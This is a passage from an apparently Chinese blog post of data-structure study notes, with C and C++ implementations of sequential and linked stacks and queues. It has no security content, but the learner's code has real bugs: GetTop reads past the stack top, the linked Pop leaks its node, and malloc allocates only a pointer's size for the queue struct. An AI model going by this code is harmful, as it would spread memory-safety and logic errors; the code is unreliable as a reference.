  &#125;<br>    sqStack-&gt;base=(ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (ElemType)*MAXSIZE);<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    &#125;<br>    sqStack-&gt;top=sqStack-&gt;base;<br>    sqStack-&gt;stackSize=MAXSIZE;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(SqStack sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==sqStack.top)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">StackLength</span><span class="hljs-params">(SqStack sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> sqStack.top-sqStack.base;<br>&#125;<br><br>status <span class="hljs-title function_">GetTop</span><span class="hljs-params">(SqStack sqStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack.base==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=*sqStack.top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">ClearStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    sqStack-&gt;base=sqStack-&gt;top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack* sqStack,ElemType e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>||sqStack-&gt;top-sqStack-&gt;base==sqStack-&gt;stackSize)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *sqStack-&gt;top++=e;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack* sqStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>|| sqStack-&gt;base==sqStack-&gt;top)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=*--sqStack-&gt;top;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">CreatSqStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        Push(sqStack,i+<span class="hljs-number">20</span>);<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">printfStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(*sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> tem;<br>    <span class="hljs-keyword">while</span>(StackLength(*sqStack)&gt;<span class="hljs-number">0</span>)&#123;<br>        Pop(sqStack,&amp;tem);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, tem);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    SqStack sqStack;<br>    sqStack.base=<span class="hljs-literal">NULL</span>;<br>    initStack(&amp;sqStack);<br>    CreatSqStack(&amp;sqStack);<br>    printfStack(&amp;sqStack);<br>    destroyStack(&amp;sqStack);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="栈链的表示和实现"><a href="#栈链的表示和实现" class="headerlink" title="栈链的表示和实现"></a>栈链的表示和实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>* <span class="hljs-title">next</span>;</span><br>&#125;StackNode,*LinkStack;<br><br><br>status <span class="hljs-title function_">InitStack</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-comment">//构造空栈</span><br>    *linkStack=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">StackEmpty</span><span class="hljs-params">(LinkStack linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>status <span class="hljs-title function_">Push</span><span class="hljs-params">(LinkStack* linkStack,ElemType e)</span>&#123;<br>    StackNode* temNode=(StackNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(StackNode));<br>    temNode-&gt;data=e;<br>    <span class="hljs-comment">//如果是第一个元素，下面代码指向的NULL</span><br>    temNode-&gt;next=(*linkStack);<br>    (*linkStack)=temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br>status <span class="hljs-title function_">Pop</span><span class="hljs-params">(LinkStack* linkStack,ElemType* e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=(*linkStack)-&gt;data;<br>    (*linkStack)=(*linkStack)-&gt;next;<br><br>&#125;<br>status <span class="hljs-title function_">DestroyStack</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(*linkStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    StackNode* deleteNode=(*linkStack);<br>    <span class="hljs-keyword">while</span>(deleteNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        (*linkStack)=(*linkStack)-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode=<span class="hljs-literal">NULL</span>;<br>        deleteNode=(*linkStack);<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>ElemType <span class="hljs-title function_">GetTop</span><span class="hljs-params">(LinkStack* linkStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>((*linkStack)==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (*linkStack)-&gt;data;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    LinkStack linkStack=<span class="hljs-literal">NULL</span>;<br>    InitStack(&amp;linkStack);<br>    <span class="hljs-type">int</span> e1=<span class="hljs-number">244</span>,e2=<span class="hljs-number">0</span>;<br>    Push(&amp;linkStack,e1);<br>    Pop(&amp;linkStack,&amp;e2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,e2);<br>    Push(&amp;linkStack,<span class="hljs-number">24</span>);<br>    e1= GetTop(&amp;linkStack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,e1);<br>    DestroyStack(&amp;linkStack);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="栈与递归"><a href="#栈与递归" class="headerlink" title="栈与递归"></a>栈与递归</h3><ol><li><p>主调函数和被调函数</p><p>如：<code>main</code>函数就是主调函数，在里面调用的函数被称为被调函数</p></li><li><p>函数的嵌套调用的方式</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%87%BD%E6%95%B0%E7%9A%84%E5%B5%8C%E5%A5%97%E8%B0%83%E7%94%A8%E7%9A%84%E5%8E%9F%E7%90%86.png"></p></li></ol><h2 id="队列的表示和操作原理"><a href="#队列的表示和操作原理" class="headerlink" title="队列的表示和操作原理"></a>队列的表示和操作原理</h2><ol><li>只能在表尾经行插入操作，在表头进行删除操作的线性表</li><li>先进先出的线性表</li><li>有顺序结构和链式结构（常用的是顺序结构）</li></ol><h3 id="队列的相关操作"><a href="#队列的相关操作" class="headerlink" title="队列的相关操作"></a>队列的相关操作</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C.png"></p><h3 id="队列的顺序表示和实现"><a href="#队列的顺序表示和实现" class="headerlink" title="队列的顺序表示和实现"></a>队列的顺序表示和实现</h3><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93.png"></p><ol><li><p>对空的表示</p><p><code>front</code>&#x3D;<code>rear</code>&#x3D;<code>0</code></p></li><li><p>队列的特殊情况</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\栈和队列.assets\image-20230402182219032.png"></p></li><li><p>假溢出和真溢出</p><ul><li><p>假溢出</p><p><code>rear</code>!&#x3D;<code>0</code></p><p><code>rear</code>&#x3D;<code>MAXQSIZE</code> 但是队列中还有空余的存储空间</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%81%87%E6%BA%A2%E5%87%BA.png"></p></li><li><p>真溢出</p><p><code>rear</code>&#x3D;<code>0</code></p><p><code>fear</code>&#x3D;<code>MAXQSIZE</code></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E7%9C%9F%E6%BA%A2%E5%87%BA.png"></p></li></ul></li><li><p>循环队列的处理逻辑</p><ul><li><p>使用<code>%</code>运算，将数组变成循环 </p></li><li><p>但是用循环队列的是时候，我们面对的是对空和对满是一种判断条件，所以我们使用标志经行判断</p><p>一下提出三种解决办法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/%E4%B8%89%E7%A7%8D%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.png"></p></li></ul></li><li><p>头文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><span class="hljs-keyword">using</span> ElemType=<span class="hljs-type">int</span>;<br><span class="hljs-keyword">using</span> status=<span class="hljs-type">int</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> ERROR=<span class="hljs-number">-1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXSIZE=<span class="hljs-number">10</span>;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Que</span>&#123;<br><br><span class="hljs-keyword">private</span>:<br>    ElemType* base;<br>    <span class="hljs-type">int</span> front;<span class="hljs-comment">//地址更小的指针</span><br>    <span class="hljs-type">int</span> rear;<span class="hljs-comment">//地址更大的指针</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Que</span>();<br>    ~<span class="hljs-built_in">Que</span>();<br>    <span class="hljs-function">status <span class="hljs-title">ClearQueue</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QueueLength</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">GetHead</span><span class="hljs-params">(ElemType&amp; e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">EnQueue</span><span class="hljs-params">(ElemType e)</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">DeQueue</span><span class="hljs-params">(ElemType &amp;e)</span></span>;<br>&#125;;<br><br></code></pre></td></tr></table></figure></li><li><p>类的实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>Que::<span class="hljs-built_in">Que</span>() &#123;<br>    base= <span class="hljs-literal">nullptr</span>;<br>    base=<span class="hljs-keyword">new</span> ElemType [MAXSIZE];<br>    <span class="hljs-keyword">if</span>(base== <span class="hljs-literal">nullptr</span>)&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;base new ERROR&quot;</span>&lt;&lt;std::endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    front=<span class="hljs-number">0</span>;<br>    rear=<span class="hljs-number">0</span>;<br>&#125;<br><br>Que::~<span class="hljs-built_in">Que</span>() &#123;<br>    <span class="hljs-keyword">delete</span>[] base;<br>    front=<span class="hljs-number">0</span>;<br>    rear=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Que::status Que::ClearQueue() &#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    return 0;</span><br><span class="hljs-comment">&#125;*/</span><br><br><span class="hljs-comment">//这个算法需要想清楚</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Que::QueueLength</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (rear-front+MAXSIZE)%MAXSIZE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::GetHead</span><span class="hljs-params">(ElemType &amp;e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(rear==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    e=*(base+front);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::EnQueue</span><span class="hljs-params">(ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>((rear+<span class="hljs-number">1</span>)%MAXSIZE==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    *(base+rear)=e;<br>    rear=(rear+<span class="hljs-number">1</span>)%MAXSIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Que::DeQueue</span><span class="hljs-params">(ElemType &amp;e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(rear==front)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    e=*(base+front);<br>    front=(front+<span class="hljs-number">1</span>)%MAXSIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><code>main.cpp</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myClass.hpp&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creatQ</span><span class="hljs-params">(Que &amp;que)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAXSIZE; ++i) &#123;<br>        que.<span class="hljs-built_in">EnQueue</span>(i + <span class="hljs-number">10</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printQueue</span><span class="hljs-params">(Que &amp;que)</span> </span>&#123;<br>    <span class="hljs-type">int</span> e;<br>    <span class="hljs-keyword">while</span> (que.<span class="hljs-built_in">GetHead</span>(e)) &#123;<br>        std::cout &lt;&lt;<span class="hljs-string">&quot;Get: &quot;</span>&lt;&lt; e &lt;&lt; std::endl;<br>        que.<span class="hljs-built_in">DeQueue</span>(e);<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;delete: &quot;</span>&lt;&lt;e&lt;&lt;std::endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Que queue;<br>    ElemType elemType = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> e;<br>    queue.<span class="hljs-built_in">EnQueue</span>(<span class="hljs-number">244</span>);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">QueueLength</span>() &lt;&lt; std::endl;<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">GetHead</span>(e) &lt;&lt; std::endl;<br>    std::cout &lt;&lt; e &lt;&lt; std::endl;<br>    <span class="hljs-built_in">creatQ</span>(queue);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">QueueLength</span>() &lt;&lt; std::endl;<br>    <span class="hljs-built_in">printQueue</span>(queue);<br>    std::cout &lt;&lt; queue.<span class="hljs-built_in">DeQueue</span>(elemType) &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h3 id="队列链式实现"><a href="#队列链式实现" class="headerlink" title="队列链式实现"></a>队列链式实现</h3><ol><li><p>节点的实现</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%98%9F%E5%88%97%E9%93%BE%E5%BC%8F%E7%9A%84%E8%8A%82%E7%82%B9.png"></p></li><li><p>基本定义</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%93%BE%E5%BC%8F%E9%98%9F%E5%88%97%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p></li><li><p>代码实例（注意win上面竟然过不了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> &#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QNode</span> *<span class="hljs-title">next</span>;</span><br>&#125; QNode, *QueuePtr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LinkQueue</span> &#123;</span><br>    QueuePtr rear;<br>    QueuePtr front;<br>&#125; LinkQueue, *LinkQNode;<br><br>status <span class="hljs-title function_">InitNode</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    QueuePtr queuePtr = (QNode *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(QNode));<br>    queuePtr-&gt;next = <span class="hljs-literal">NULL</span>;<br>    queuePtr-&gt;data = <span class="hljs-number">0</span>;<br>    (*linkQueue)-&gt;front = queuePtr;<br>    (*linkQueue)-&gt;rear = queuePtr;<br>&#125;<br><br>status <span class="hljs-title function_">DestroyNode</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*linkQueue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    QNode *deleteNode = (*linkQueue)-&gt;front;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (deleteNode != <span class="hljs-literal">NULL</span>) &#123;<br>        (*linkQueue)-&gt;front = (*linkQueue)-&gt;front-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>        deleteNode = (*linkQueue)-&gt;front;<br>        num++;<br>    &#125;<br>    (*linkQueue)-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">free</span>(*linkQueue);<br>    (*linkQueue)=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">CreatLinkQueue</span><span class="hljs-params">(LinkQNode *linkQueue)</span> &#123;<br>    (*linkQueue) = (LinkQueue *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(linkQueue));<br>    <span class="hljs-keyword">if</span> 